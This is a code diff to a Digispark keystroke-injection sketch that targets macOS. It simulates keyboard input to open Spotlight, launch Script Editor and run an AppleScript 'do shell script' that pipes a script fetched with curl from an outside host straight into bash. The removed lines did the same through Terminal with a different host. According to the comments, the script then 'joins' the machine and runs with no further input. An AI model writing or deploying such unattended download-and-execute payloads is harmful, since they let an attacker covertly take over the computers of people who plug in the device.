@@ -17,13 +17,18 @@ void setup() {
 
     DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
     DigiKeyboard.delay(100);
-    DigiKeyboard.print("Terminal");
-    DigiKeyboard.delay(4000); // Sometimes Spotlight needs a bit to find what it's looking for
+    DigiKeyboard.print("Script Editor");
+    DigiKeyboard.delay(3000); // Sometimes Spotlight needs a bit to find what it's looking for
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(2000); // Give Terminal a couple seconds to start up
-    DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT); // Open a new tab
-    DigiKeyboard.delay(800);
-    DigiKeyboard.println("curl -L erikboesen.com/jm.sh |bash"); // Download and run join script; will now run without further input
+    DigiKeyboard.delay(2000); // Give Script Editor a couple seconds to start up
+    // Clear editor if necessary
+    DigiKeyboard.sendKeyStroke(KEY_A, MOD_GUI_LEFT); // Select all
+    DigiKeyboard.delay(100);
+    DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // Cut (no key for delete)
+    DigiKeyboard.delay(100);
+    DigiKeyboard.println("do shell script \"curl -L boesen.science:2042/mac/join.sh |bash\""); // Type out command to handle joining
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Run AppleScript
+    // Script Editor will be killed at the end of the join script
 
     // Turn off LED
     digitalWrite(0, LOW);
